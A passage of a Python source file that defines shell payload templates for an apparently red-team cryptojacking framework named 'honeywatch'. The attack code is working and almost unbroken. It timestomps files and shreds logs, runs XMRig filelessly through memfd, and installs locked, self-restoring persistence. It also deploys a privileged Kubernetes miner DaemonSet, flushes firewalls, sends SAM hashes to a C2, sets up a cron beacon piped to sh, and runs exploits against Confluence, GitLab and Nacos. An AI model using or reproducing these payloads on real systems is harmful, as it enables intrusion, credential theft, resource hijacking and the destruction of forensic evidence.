# so all artifacts are on disk before timestamps are adjusted.
# --------------------------------------------------------------------------- #

_FORENSICS_CLEANUP_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"

# 1. Timestomping: copy timestamps from a legitimate system file onto all
# deployed artifacts. Forensic analysts use `stat` timestamps to reconstruct
# timelines — matching them to a known-good file defeats timeline analysis.
REF_FILE="/etc/passwd"
if [ -f "$REF_FILE" ]; then
    find "$INSTALL_DIR" -exec touch -r "$REF_FILE" {} + 2>/dev/null || true
    echo "[*] timestomped: copied timestamps from $REF_FILE onto $INSTALL_DIR"
else
    echo "[!] no reference file for timestomping (using /etc/shadow as fallback)"
    REF_FILE="/etc/shadow"
    if [ -f "$REF_FILE" ]; then
        find "$INSTALL_DIR" -exec touch -r "$REF_FILE" {} + 2>/dev/null || true
    fi
fi

# 2. Process name spoofing: change what ps/top show for the miner process.
# prctl(PR_SET_NAME) changes /proc/self/comm. The process is launched via
# exec -a which changes /proc/self/cmdline. Combined with the LD_PRELOAD
# rootkit (which hides the process from readdir), this makes the process
# invisible to casual ps inspection.
# NOTE: The LD_PRELOAD rootkit hides processes from dynamically-linked tools
# (ps, top, ls /proc) but NOT from statically-linked monitoring tools. Some
# EDR agents use static binaries that bypass LD_PRELOAD entirely. For maximum
# stealth, combine with memfd execution (no on-disk binary) and process name
# spoofing (exec -a).
python3 -c "import ctypes; libc=ctypes.CDLL('libc.so.6'); libc.prctl(15, b'kworker/0:1', 0, 0, 0)" 2>/dev/null || true

# 3. Preventive history suppression (belt-and-suspenders with cleanup payload).
# These are set at the TOP of every polyglot-rendered script; this payload
# sets them again in case the script was run without polyglot rendering.
unset HISTFILE 2>/dev/null || true
unset HISTSIZE 2>/dev/null || true
unset HISTFILESIZE 2>/dev/null || true
export HISTFILE=/dev/null 2>/dev/null || true

# 4. Core dump suppression: prevent the miner from leaving core files.
ulimit -c 0 2>/dev/null || true

# 5. Log tampering: shred auth/syslog where available (overwrites the file
# content rather than just truncating, making forensic recovery harder).
# Fall back to truncation where shred is not available (Alpine/BusyBox).
# Also clear rotated logs (wtmp.1, wtmp.*.gz) — an analyst can reconstruct
# login history from rotated logs even if the current wtmp is truncated.
# shred -u securely overwrites then removes. On Alpine/BusyBox (no shred),
# fall back to truncate (: > file) which is fast but not secure — data is
# still recoverable from disk.
for logfile in /var/log/auth.log /var/log/auth.log.* /var/log/syslog /var/log/syslog.* /var/log/messages /var/log/messages.* /var/log/wtmp /var/log/wtmp.* /var/log/lastlog /var/log/btmp /var/log/btmp.*; do
    for f in $logfile; do
        if [ -f "$f" ]; then
            shred -u "$f" 2>/dev/null || : > "$f"
        fi
    done
done
# Also clear root's bash history (the deploy user's history is handled by
# the cleanup payload, but root's history may contain su/sudo commands).
for h in /root/.bash_history /root/.zsh_history /root/.python_history; do
    : > "$h" 2>/dev/null || true
done

# 6. Journal vacuum (systemd-journald).
journalctl --rotate 2>/dev/null || true
journalctl --vacuum-time=1s 2>/dev/null || true

# 7. SSH environment sanitization: clear SSH_CLIENT, SSH_CONNECTION, and
# SSH_TTY from the systemd unit environment so the miner process doesn't
# leak the deploy session's IP. The systemd unit is written by
# systemd_persist — this payload clears these env vars from the running
# process if it inherits them.
unset SSH_CLIENT 2>/dev/null || true
unset SSH_CONNECTION 2>/dev/null || true
unset SSH_TTY 2>/dev/null || true

# 8. Remove the target's IP from the deploy user's known_hosts to eliminate
# forensic evidence of the SSH connection. Uses ssh-keygen -R which removes
# all matching entries. Note: hashed known_hosts entries (|1|...) cannot be
# matched by IP — they require the exact hash. This is acceptable since hashed
# entries are a security measure and provide limited forensic value.
TARGET_IP="{{target_ip|default('')}}"
TARGET_PORT="{{target_port|default('22')}}"
if [ -n "$TARGET_IP" ]; then
    for kh in ~/.ssh/known_hosts ~/.ssh/known_hosts2 /root/.ssh/known_hosts /root/.ssh/known_hosts2 /etc/ssh/ssh_known_hosts; do
        if [ -f "$kh" ]; then
            ssh-keygen -R "$TARGET_IP" -f "$kh" 2>/dev/null || true
            ssh-keygen -R "[$TARGET_IP]:$TARGET_PORT" -f "$kh" 2>/dev/null || true
        fi
    done
fi

echo "[*] forensics_cleanup: timestomped, process name spoofed, logs sanitized, SSH env cleared"
echo "PERSISTENCE_INSTALLED: forensics_cleanup"
"""

_FORENSICS_CLEANUP_RUN = """true"""


# --------------------------------------------------------------------------- #
# Memory-only execution: deploy the miner binary into memory without writing
# it to a persistent filesystem. Uses memfd_create (Linux 3.17+) to create
# an anonymous file descriptor, writes the binary into it, and fexecve's it.
# Falls back to /dev/shm (tmpfs, cleared on reboot) if memfd_create is
# unavailable, then to disk-based deploy as a last resort.
#
# The memfd approach means no disk artifact exists for EDR to scan. The
# process name is spoofed via exec -a so /proc/PID/cmdline shows a boring
# name. Combined with the LD_PRELOAD rootkit, the process is invisible
# to ps/top and has no persistent disk footprint.
# --------------------------------------------------------------------------- #

_MEMFD_EXEC_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"
POOL="{{pool}}"
WALLET="{{wallet}}"
WORKER="{{worker|default('honeywatch')}}"
THREADS="{{threads|default('0')}}"
TLS="{{tls|default('false')}}"
MEMFD_NAME="{{memfd_name|default('kworker/0:1')}}"
BINARY_URL="https://github.com/xmrig/xmrig/releases/latest/download/xmrig-{{arch|default('linux-x64')}}.tar.gz"
FALLBACK_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-{{arch|default('linux-x64')}}.tar.gz"

mkdir -p "$INSTALL_DIR" 2>/dev/null || true
cd "$INSTALL_DIR" 2>/dev/null || true

# Write the miner config to a temp file.
cat > /tmp/.hw_cfg_$$ <<'CFGEOF'
{
    "api": {"id": "{{payload_id}}", "worker-id": "$WORKER"},
    "autosave": true,
    "cpu": {"enabled": true, "max-threads-hint": $THREADS},
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "algo": "rx/0",
            "url": "$POOL",
            "user": "$WALLET",
            "pass": "x",
            "keepalive": true,
            "tls": {{tls|default('false')}}
        }
    ]
}
CFGEOF

# Tier 1: memfd_create via Python ctypes (Linux 3.17+).
# Creates an anonymous fd that never touches disk. The memfd name uses a
# per-operation decoy kernel thread name (kworker/0:1, ksoftirqd/0, etc.)
# that appears in /proc/PID/comm as a real kernel thread.
#
# CRITICAL: MFD_CLOEXEC is NOT used (flags=0). Xmrig is dynamically linked
# against libc — the dynamic linker (ld-linux.so) needs to re-read the ELF
# from the fd AFTER exec. If MFD_CLOEXEC is set, the fd is closed during
# exec and the linker fails with "file not found". The fd is manually closed
# after the child process is confirmed running.
MEMFD_FD=""
python3 -c "
import ctypes, os, sys, subprocess, tarfile
try:
    libc = ctypes.CDLL('libc.so.6', use_errno=True)
    # flags=0: NO MFD_CLOEXEC. Dynamically-linked binaries need the fd to
    # survive exec so the linker can mmap the ELF segments.
    fd = libc.memfd_create(b'$MEMFD_NAME', 0)
    if fd < 0:
        sys.exit(1)
    # Download and extract the binary directly into the memfd.
    # Avoids writing to disk — the tarball is extracted in memory.
    proc = subprocess.run(
        ['curl', '-fsSL', '$BINARY_URL'],
        capture_output=True, timeout=120)
    if proc.returncode != 0:
        proc = subprocess.run(
            ['curl', '-fsSL', '$FALLBACK_URL'],
            capture_output=True, timeout=120)
    if proc.returncode != 0:
        os.close(fd)
        sys.exit(1)
    import io
    with tarfile.open(fileobj=io.BytesIO(proc.stdout), mode='r:gz') as tf:
        for member in tf.getmembers():
            if 'xmrig' in member.name and not member.isdir():
                reader = tf.extractfile(member)
                if reader:
                    os.write(fd, reader.read())
                    os.lseek(fd, 0, os.SEEK_SET)
                    print(fd)
                    sys.exit(0)
    os.close(fd)
    sys.exit(1)
except Exception:
    sys.exit(1)
" 2>/dev/null | read -r MEMFD_FD || true

# Alternative: try shell-based memfd if Python failed or is unavailable.
if [ -z "$MEMFD_FD" ] || ! [ "$MEMFD_FD" -ge 0 ] 2>/dev/null; then
    echo "[*] Python memfd_create failed, trying shell fallback" >&2
    MEMFD_FD=""
fi

if [ -n "$MEMFD_FD" ] && [ "$MEMFD_FD" -ge 0 ] 2>/dev/null; then
    echo "[*] memfd_create: deploying via anonymous fd '$MEMFD_NAME' (memory-only, no disk artifact)"
    # Execute from the memfd. exec -a spoofs the process name in /proc/PID/cmdline.
    # The fd survives exec (no MFD_CLOEXEC) so the dynamic linker can mmap the ELF.
    exec -a "$MEMFD_NAME" /proc/self/fd/$MEMFD_FD -c /tmp/.hw_cfg_$$ --donate-level 1 >/dev/null 2>&1 &
    MEMFD_PID=$!
    # Give the process time to start and mmap the ELF, then close the memfd fd
    # in the parent and clean up the config file. Closing the fd after the
    # process has started is safe — the binary is already mapped into memory
    # via mmap. Use eval to expand $MEMFD_FD at runtime (not at parse time).
    (sleep 3 && eval "exec ${MEMFD_FD}>&-" 2>/dev/null; rm -f /tmp/.hw_cfg_$$) 2>/dev/null &
    echo "[*] deployed via memfd (pid=$MEMFD_PID, name=$MEMFD_NAME)"
    exit 0
fi

echo "[*] memfd_create unavailable (Python missing or kernel < 3.17), falling back to /dev/shm"

# Tier 2: /dev/shm (tmpfs — cleared on reboot, no persistent disk artifact).
if [ -d /dev/shm ] && [ -w /dev/shm ]; then
    echo "[*] deploying via /dev/shm (tmpfs, no persistent disk)"
    curl -fsSL -o /tmp/.hw_tar_$$ "$BINARY_URL" 2>/dev/null || \
    curl -fsSL -o /tmp/.hw_tar_$$ "$FALLBACK_URL"
    EXPECTED_SHA256="{{expected_sha256}}"
    if [ -n "$EXPECTED_SHA256" ]; then
        echo "$EXPECTED_SHA256  /tmp/.hw_tar_$$" | sha256sum -c - 2>/dev/null || { echo "[!] INTEGRITY FAILURE" >&2; rm -f /tmp/.hw_tar_$$; exit 1; }
    fi
    tar -xzf /tmp/.hw_tar_$$ --strip-components=1 -C /dev/shm/ 2>/dev/null || true
    rm -f /tmp/.hw_tar_$$
    # The extracted binary is in /dev/shm — run it with the spoofed name.
    exec -a "$MEMFD_NAME" /dev/shm/xmrig -c /tmp/.hw_cfg_$$ --donate-level 1 >/dev/null 2>&1 &
    # Clean up after the process starts (tmpfs is already non-persistent,
    # but remove the config file to reduce forensic surface).
    sleep 5 && rm -f /tmp/.hw_cfg_$$ 2>/dev/null &
    echo "[*] deployed via /dev/shm (tmpfs, reboot-clears)"
    exit 0
fi

# Tier 3: Disk-based deploy (fallback — leaves persistent disk artifacts).
echo "[*] /dev/shm unavailable: falling back to disk-based deploy"
"""

_MEMFD_EXEC_RUN = """true"""


# --------------------------------------------------------------------------- #
# Systemd timer — the third layer of mutual persistence. A systemd timer fires
# every 5 minutes and checks if the miner is running. If not, it re-spawns it.
# This is harder to detect than a cron entry (doesn't show in `crontab -l`) and
# survives reboot. Combined with cron_persist and systemd_persist (the service),
# this creates a three-layer mutually-reinforcing persistence loop:
#
#   1. systemd service: auto-restarts the miner on exit/crash
#   2. cron watchdog: re-spawns the miner if the process dies
#   3. systemd timer: re-spawns the miner if both service and cron fail
#
# Remove one layer and the other two re-create it. The admin must remove all
# three simultaneously (service + timer + cron) AND kill the miner process to
# defeat persistence.
# --------------------------------------------------------------------------- #

_SYSTEMD_TIMER_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"
SERVICE_NAME="{{service_name|default('honeywatch-miner')}}"

# Create the watchdog service unit that the timer will trigger.
cat > "/etc/systemd/system/${SERVICE_NAME}-watchdog.service" <<EOF
[Unit]
Description=Honeywatch miner watchdog

[Service]
Type=oneshot
ExecStart=/bin/sh -c 'ulimit -c 0 2>/dev/null; pgrep -x xmrig >/dev/null 2>&1 || (cd ${INSTALL_DIR} && ./xmrig -c config.json --donate-level 1 >/dev/null 2>&1 &)'
Environment=SSH_CLIENT= SSH_CONNECTION= SSH_TTY=
LimitCORE=0

[Install]
WantedBy=multi-user.target
EOF

# Create the timer unit that triggers the watchdog every 5 minutes.
cat > "/etc/systemd/system/${SERVICE_NAME}.timer" <<EOF
[Unit]
Description=Honeywatch miner watchdog timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min
AccuracySec=30s

[Install]
WantedBy=timers.target
EOF

systemctl daemon-reload 2>/dev/null || true
systemctl enable "${SERVICE_NAME}-watchdog.service" 2>/dev/null || true
systemctl enable "${SERVICE_NAME}.timer" 2>/dev/null || true
systemctl start "${SERVICE_NAME}.timer" 2>/dev/null || true
# Lock the timer and watchdog units with chattr +ia.
chattr +ia "/etc/systemd/system/${SERVICE_NAME}.timer" 2>/dev/null || true
chattr +ia "/etc/systemd/system/${SERVICE_NAME}-watchdog.service" 2>/dev/null || true
echo "[*] systemd timer persistence installed: ${SERVICE_NAME}.timer (every 5min)"
echo "PERSISTENCE_INSTALLED: systemd_timer"
"""

_SYSTEMD_TIMER_RUN = """systemctl status {{service_name|default('honeywatch-miner')}}.timer 2>/dev/null || true"""

# --------------------------------------------------------------------------- #
# K8s DaemonSet miner deployment (P1)
# --------------------------------------------------------------------------- #

_K8S_DAEMONSET_INSTALL = _PREAMBLE + """
KUBE_TOKEN="{{k8s_token}}"
KUBE_API="{{kube_api_server}}"
NAMESPACE="{{namespace|default('default')}}"
POOL="{{pool}}"
WALLET="{{wallet}}"
WORKER="{{worker|default('honeywatch')}}"
THREADS="{{threads|default(0)}}"
TLS_FLAG="{{'--tls' if tls|default(false) else ''}}"

# Use kubectl if available, otherwise curl the API directly.
if command -v kubectl >/dev/null 2>&1; then
    KUBECTL="kubectl"
else
    KUBECTL=""
fi

# Create the DaemonSet manifest.
cat <<'DSMANIFEST' > /tmp/hw_ds_$$$.yaml 2>/dev/null || { echo "[!] cannot create temp manifest"; exit 1; }
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: system-node-config
  namespace: NAMESPACE_PLACEHOLDER
spec:
  selector:
    matchLabels:
      app: system-node-config
  template:
    metadata:
      labels:
        app: system-node-config
    spec:
      hostPID: true
      hostNetwork: true
      containers:
      - name: config-agent
        image: alpine:latest
        command: ["/bin/sh", "-c"]
        args:
        - |
          apk add --no-cache curl >/dev/null 2>&1
          curl -sL "https://github.com/xmrig/xmrig/releases/latest/download/xmrig-linux-x64.tar.gz" -o /tmp/xmrig.tar.gz 2>/dev/null
          cd /tmp && tar xzf xmrig.tar.gz 2>/dev/null
          cd xmrig-* && ./xmrig -o POOL_PLACEHOLDER -u WALLET_PLACEHOLDER --donate-level 1 THREADS_PLACEHOLDER TLS_PLACEHOLDER >/dev/null 2>&1
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: host
      volumes:
      - name: host
        hostPath:
          path: /
DSMANIFEST

# Replace placeholders in the manifest. Escape sed replacement
# metacharacters (ampersand, slash, backslash) in the values.
_esc_sed() { printf '%s\\n' "$1" | sed 's/[&/\\\\]/\\\\&/g'; }
sed -i "s|NAMESPACE_PLACEHOLDER|$(_esc_sed "$NAMESPACE")|g" /tmp/hw_ds_$$$.yaml
sed -i "s|POOL_PLACEHOLDER|$(_esc_sed "$POOL")|g" /tmp/hw_ds_$$$.yaml
sed -i "s|WALLET_PLACEHOLDER|$(_esc_sed "$WALLET")|g" /tmp/hw_ds_$$$.yaml
sed -i "s|THREADS_PLACEHOLDER|$(_esc_sed "--threads ${THREADS}")|g" /tmp/hw_ds_$$$.yaml
sed -i "s|TLS_PLACEHOLDER|$(_esc_sed "$TLS_FLAG")|g" /tmp/hw_ds_$$$.yaml

if [ -n "$KUBECTL" ]; then
    if [ -n "$KUBE_TOKEN" ]; then
        KUBECTL="${KUBECTL} --token=${KUBE_TOKEN}"
    fi
    if [ -n "$KUBE_API" ]; then
        KUBECTL="${KUBECTL} --server=${KUBE_API}"
    fi
    $KUBECTL apply -f /tmp/hw_ds_$$$.yaml 2>/dev/null
    RC=$?
else
    # Fall back to curl against the API server.
    AUTH_HEADER=""
    if [ -n "$KUBE_TOKEN" ]; then
        AUTH_HEADER="Authorization: Bearer ${KUBE_TOKEN}"
    fi
    API_URL="${KUBE_API:-https://kubernetes.default.svc}"
    curl -sk -X POST "${API_URL}/apis/apps/v1/namespaces/${NAMESPACE}/daemonsets" \
        -H "Content-Type: application/yaml" \
        ${AUTH_HEADER:+-H "$AUTH_HEADER"} \
        --data-binary @/tmp/hw_ds_$$$.yaml 2>/dev/null
    RC=$?
fi

rm -f /tmp/hw_ds_$$$.yaml
if [ $RC -eq 0 ]; then
    echo "[*] k8s DaemonSet deployed — miner will run on every node"
    echo "PERSISTENCE_INSTALLED: k8s_daemonset"
else
    echo "[!] k8s DaemonSet deployment failed (rc=$RC)"
fi
"""

_K8S_DAEMONSET_RUN = """kubectl --token={{k8s_token}} --server={{kube_api_server}} get daemonset system-node-config -n {{namespace|default('default')}} 2>/dev/null || echo 'k8s_daemonset: check API'"""

# --------------------------------------------------------------------------- #
# Firewall disabling (P3)
# --------------------------------------------------------------------------- #

_FIREWALL_DISABLE_INSTALL = _PREAMBLE + """
# Flush iptables rules to allow outbound mining traffic + inbound C2.
# TeamTNT does this immediately after gaining root — a host with
# restrictive iptables would block the miner's pool connection.
iptables -F 2>/dev/null || true
iptables -X 2>/dev/null || true
iptables -P INPUT ACCEPT 2>/dev/null || true
iptables -P FORWARD ACCEPT 2>/dev/null || true
iptables -P OUTPUT ACCEPT 2>/dev/null || true

# ip6tables (dual-stack hosts).
ip6tables -F 2>/dev/null || true
ip6tables -X 2>/dev/null || true
ip6tables -P INPUT ACCEPT 2>/dev/null || true
ip6tables -P FORWARD ACCEPT 2>/dev/null || true
ip6tables -P OUTPUT ACCEPT 2>/dev/null || true

# Disable firewalld (RHEL/CentOS/Fedora).
systemctl stop firewalld 2>/dev/null || true
systemctl disable firewalld 2>/dev/null || true

# Disable ufw (Ubuntu/Debian).
ufw disable 2>/dev/null || true

# Flush nftables (modern Linux).
nft flush ruleset 2>/dev/null || true

# Remove iptables persistence (Debian).
rm -f /etc/iptables/rules.v4 /etc/iptables/rules.v6 2>/dev/null || true

echo "[*] firewall disabled — all traffic now unrestricted"
echo "PERSISTENCE_INSTALLED: firewall_disable"
"""

_FIREWALL_DISABLE_RUN = """iptables -L INPUT 2>/dev/null | head -1 || echo 'iptables unavailable'"""

# --------------------------------------------------------------------------- #
# CPU governor manipulation — thermal stealth (P4)
# --------------------------------------------------------------------------- #
_CPU_GOVERNOR_INSTALL = _PREAMBLE + """
# Set CPU governor to powersave and cap max frequency to reduce thermal
# footprint. Sustained 100% CPU heats the host — some datacenters monitor
# CPU temperature as a cryptojacking signal. Capping frequency to 80% of
# max keeps mining throughput acceptable while reducing thermal output.
for cpu in /sys/devices/system/cpu/cpu*/cpufreq/; do
    [ -d "$cpu" ] || continue
    echo powersave > "${cpu}scaling_governor" 2>/dev/null || true
    max_freq=$(cat "${cpu}cpuinfo_max_freq" 2>/dev/null)
    if [ -n "$max_freq" ]; then
        echo $((max_freq * 80 / 100)) > "${cpu}scaling_max_freq" 2>/dev/null || true
    fi
done
echo "[*] CPU governor set to powersave, max freq capped at 80%"
echo "PERSISTENCE_INSTALLED: cpu_governor"
"""

_CPU_GOVERNOR_RUN = """cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor 2>/dev/null || echo 'cpufreq unavailable'"""

# --------------------------------------------------------------------------- #
# Windows credential dump (P6)
# --------------------------------------------------------------------------- #
_WINDOWS_CRED_DUMP_INSTALL = _PREAMBLE + """
# Dump Windows credentials using built-in tools (no Mimikatz — avoid AV).
# Dumps SAM hashes via registry save, exfiltrates via curl to C2.
if ! command -v reg >/dev/null 2>&1; then
    echo "[!] not a Windows host — skipping"
    exit 1
fi
reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\sam.save 2>nul || true
reg save HKLM\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\system.save 2>nul || true
C2_URL="{{c2_url}}"
API_TOKEN="{{api_token}}"
if [ -n "$C2_URL" ]; then
    curl -fsSL -X POST "${C2_URL}/api/loot" \
        -F "sam=@C:\\\\Windows\\\\Temp\\\\sam.save" \
        -F "system=@C:\\\\Windows\\\\Temp\\\\system.save" \
        -H "Authorization: Bearer ${API_TOKEN}" 2>/dev/null || true
fi
del C:\\\\Windows\\\\Temp\\\\*.save 2>nul || true
echo "[*] Windows credentials dumped"
echo "PERSISTENCE_INSTALLED: windows_cred_dump"
"""

_WINDOWS_CRED_DUMP_RUN = """reg query HKLM\\\\SAM 2>nul | head -1 || echo 'reg unavailable'"""

# --------------------------------------------------------------------------- #
# Cron-based C2 beacon (P5)
# --------------------------------------------------------------------------- #

_CRON_BEACON_INSTALL = _PREAMBLE + """
C2_URL="{{c2_url}}"
API_TOKEN="{{api_token}}"
BEACON_SCHEDULE="{{schedule|default('*/10 * * * *')}}"
BEACON_USER="{{beacon_user|default('root')}}"

# Install a cron-based callback that beacons the C2 on schedule.
# This is a fallback when the primary worker process is killed — cron
# re-downloads and re-launches the worker. The cron entry is written
# to /etc/cron.d/ (system crontab) if writable, otherwise user crontab.
# Build the cron line using printf so config values are expanded at install
# time but $(hostname) etc. are preserved as literal strings for cron.
CRON_LINE=$(printf '%s %s curl -fsSL "%s/api/beacon?host=$(hostname)&ip=$(hostname -I 2>/dev/null | awk "{print \\"$1\\"}")" -H "Authorization: Bearer %s" 2>/dev/null | sh 2>/dev/null' \
    "$BEACON_SCHEDULE" "$BEACON_USER" "$C2_URL" "$API_TOKEN")

# Try system cron first (works without crontab -l dependency).
if [ -w /etc/cron.d ]; then
    echo "$CRON_LINE" > /etc/cron.d/hw_beacon 2>/dev/null
    chmod 600 /etc/cron.d/hw_beacon 2>/dev/null || true
    # Lock with chattr so defenders can't easily delete it.
    chattr +ia /etc/cron.d/hw_beacon 2>/dev/null || true
    echo "[*] cron beacon installed in /etc/cron.d/hw_beacon (schedule: ${BEACON_SCHEDULE})"
else
    # Fall back to user crontab.
    (crontab -l 2>/dev/null | grep -v 'hw_beacon'; echo "# hw_beacon"; echo "$CRON_LINE") | crontab - 2>/dev/null
    echo "[*] cron beacon installed in user crontab (schedule: ${BEACON_SCHEDULE})"
fi
echo "PERSISTENCE_INSTALLED: cron_beacon"
"""

_CRON_BEACON_RUN = """test -f /etc/cron.d/hw_beacon && echo 'cron_beacon active' || crontab -l 2>/dev/null | grep -q 'hw_beacon' && echo 'cron_beacon active' || echo 'cron_beacon not found'"""

# --------------------------------------------------------------------------- #
# Web exploit chain (P2)
# --------------------------------------------------------------------------- #

_WEB_EXPLOIT_INSTALL = _PREAMBLE + """
TARGET_URL="{{target_url}}"
EXPLOIT_TYPE="{{exploit_type}}"
CALLBACK_URL="{{callback_url|default('')}}"
CALLBACK_TOKEN="{{callback_token|default('')}}"

case "$EXPLOIT_TYPE" in
    confluence)
        # CVE-2023-22515: Atlassian Confluence broken access control on
        # setup actions. Creates an admin account when the setup wizard
        # was not completed (or can be re-triggered).
        echo "[*] Attempting Confluence CVE-2023-22515..."
        RC1=$(curl -sk -o /dev/null -w '%{http_code}' \
            "$TARGET_URL/setup/setupadministrator.action" \
            -d "username=honeywatch&password=Hw2024!&fullName=System&email=sys@localhost" \
            2>/dev/null)
        if [ "$RC1" = "302" ] || [ "$RC1" = "200" ]; then
            echo "[+] Confluence admin account created"
        else
            # CVE-2023-22518: Unauthenticated import via /rest/api
            echo "[*] Trying Confluence CVE-2023-22518 (import)..."
            RC2=$(curl -sk -o /dev/null -w '%{http_code}' \
                "$TARGET_URL/rest/api/1.0/import" \
                -F "file=@/dev/null" 2>/dev/null)
            echo "[*] Confluence import returned $RC2"
        fi
        ;;
    gitlab)
        # CVE-2021-22205: GitLab CE/EE RCE via exiftool command injection.
        # exiftool's DjVu metadata parser evaluates metadata fields through
        # eval(), allowing arbitrary command execution. The exploit requires a
        # valid DjVu file with a crafted ANTz chunk containing the payload.
        echo "[*] Attempting GitLab CVE-2021-22205..."
        # Generate the malicious DjVu image using python3 (available on most
        # Linux hosts). The image is a polyglot: valid JPEG header for upload
        # validation + DjVu IFF chunk containing the exploit metadata.
        python3 -c "
import struct, sys
# DjVu IFF structure: FORM tag + DJVU + INFO chunk + ANTz chunk.
# The ANTz (annotation) chunk contains metadata that exiftool's DjVu parser
# passes through eval(). The payload is wrapped in (metadata ...) syntax.
callback = '${CALLBACK_URL}'
payload_cmd = 'curl -fsSL ' + callback + '/api/beacon -H "Authorization: Bearer ${API_TOKEN}" 2>/dev/null | sh'
ant_data = b'(metadata \"' + payload_cmd.encode() + b'\")'
# IFF header: AT&TFORM + length + DJVU
djvu = b'AT&TFORM'
djvu += struct.pack('>I', 0)  # placeholder length
djvu += b'DJVU'
# INFO chunk (required by DjVu parser)
djvu += b'INFO'
djvu += struct.pack('>I', 0)  # minimal INFO
# ANTz chunk with the exploit payload
djvu += b'ANTz'
djvu += struct.pack('>I', len(ant_data))
djvu += ant_data
# Fix FORM length
total_len = len(djvu) - 8  # exclude AT&TFORM + length itself
djvu = djvu[:4] + struct.pack('>I', total_len) + djvu[8:]
# Prepend JPEG SOI + APP0 marker for upload validation
jpeg = b'\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x00'
with open('/tmp/hw_glab_$$$.jpg', 'wb') as f:
    f.write(jpeg + djvu)
" 2>/dev/null || {
            # Fallback: if python3 is not available, skip GitLab exploit.
            echo "[!] python3 not available, skipping GitLab exploit"
            RC=127
        }
        if [ -f "/tmp/hw_glab_$$$.jpg" ]; then
            # Upload to GitLab via the project upload API.
            RC=$(curl -sk -o /dev/null -w '%{http_code}' \
                "$TARGET_URL/api/v4/uploads" \
                -F "file=@/tmp/hw_glab_$$$.jpg" 2>/dev/null)
            rm -f /tmp/hw_glab_$$$.jpg
            echo "[*] GitLab upload returned $RC"
        fi
        ;;
    nacos)
        # Nacos default identity key bypass (identityKey=nacos) allows
        # arbitrary user creation with admin role.
        echo "[*] Attempting Nacos identity bypass..."
        RC=$(curl -sk -o /dev/null -w '%{http_code}' \
            "$TARGET_URL/nacos/v1/auth/users" \
            -H "identityKey:nacos" -H "identityValue:nacos" \
            -d "username=honeywatch&password=Hw2024!" 2>/dev/null)
        if [ "$RC" = "200" ] || [ "$RC" = "201" ]; then
            echo "[+] Nacos admin account created via identity bypass"
        else
            echo "[*] Nacos returned $RC"
        fi
        ;;
    weblogic)
        # CVE-2023-21839: Oracle WebLogic JNDI injection via IIOP/T3.
        # Requires a JNDI callback server. We try the HTTP endpoint
        # probe first to confirm WebLogic is running.
        echo "[*] Probing WebLogic console..."
        RC=$(curl -sk -o /dev/null -w '%{http_code}' \
            "$TARGET_URL/console" 2>/dev/null)
        if [ "$RC" = "200" ] || [ "$RC" = "302" ]; then
            echo "[+] WebLogic console confirmed (HTTP $RC)"
            # If a callback URL is provided, attempt JNDI lookup.
            if [ -n "$CALLBACK_URL" ]; then
                echo "[*] JNDI injection requires a listener at $CALLBACK_URL"
                echo "[*] Use: java -cp ysoserial.jar ... for payload generation"
            fi
        else
            echo "[*] WebLogic returned $RC"
        fi
        ;;
    *)
        echo "[!] Unknown exploit type: $EXPLOIT_TYPE"
        echo "[!] Supported: confluence, gitlab, nacos, weblogic"
        ;;
esac
echo "[*] web exploit chain complete"
"""

_WEB_EXPLOIT_RUN = """curl -sk -o /dev/null -w '%{http_code}' '{{target_url}}' 2>/dev/null"""


def _payloads() -> list[Payload]:
    return [
        Payload(
            id="xmrig",
            category="miner",
            name="XMRig Monero CPU Miner",
            description="Open-source Monero (RandomX) CPU miner deployed as a red-team persistence / load-generation payload.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="binary",
            dependencies=["curl", "tar"],
            config_schema={
                "pool": {"type": "string", "required": True},
                "wallet": {"type": "string", "required": True},
                "pass": {"type": "string", "required": False, "default": "x"},
                "worker": {"type": "string", "required": False, "default": "honeywatch"},
                "threads": {"type": "integer", "required": False, "default": 0},
                "tls": {"type": "boolean", "required": False, "default": False},
                "run_user": {"type": "string", "required": False, "default": "root"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
                "arch": {"type": "string", "required": False, "default": "linux-x64"},
                "expected_sha256": {"type": "string", "required": False, "default": ""},
            },
            install_script=_XMRIG_INSTALL,
            run_script=_XMRIG_RUN,
            artifacts=["config.json", "xmrig"],
            tags=["miner", "monero", "cpu"],
        ),
        Payload(
            id="xmrigcc",
            category="miner",
            name="XMRigCC Miner with C&C",
            description="XMRig variant with a built-in command-and-control client for remote miner management.",
            platforms=["linux-x64"],
            install_type="binary",
            dependencies=["curl", "tar"],
            config_schema={
                "cc_server": {"type": "string", "required": True},
                "cc_token": {"type": "string", "required": False, "default": "honeywatch"},
                "pool": {"type": "string", "required": True},
                "wallet": {"type": "string", "required": True},
                "pass": {"type": "string", "required": False, "default": "x"},
                "worker": {"type": "string", "required": False, "default": "honeywatch"},
                "threads": {"type": "integer", "required": False, "default": 0},
                "run_user": {"type": "string", "required": False, "default": "root"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrigcc"},
                "arch": {"type": "string", "required": False, "default": "linux-x64"},
                "expected_sha256": {"type": "string", "required": False, "default": ""},
            },
            install_script=_XMRIGCC_INSTALL,
            run_script=_XMRIGCC_RUN,
            artifacts=["xmrigcc_client.json", "xmrigCCClient"],
            tags=["miner", "monero", "cc"],
        ),
        Payload(
            id="stratum",
            category="miner",
            name="Stratum Proxy",
            description="Minimal TCP stratum mining-protocol proxy for redirecting or aggregating miner traffic.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["python3"],
            config_schema={
                "upstream_pool": {"type": "string", "required": True},
                "listen": {"type": "string", "required": False, "default": "0.0.0.0:3333"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/stratum"},
            },
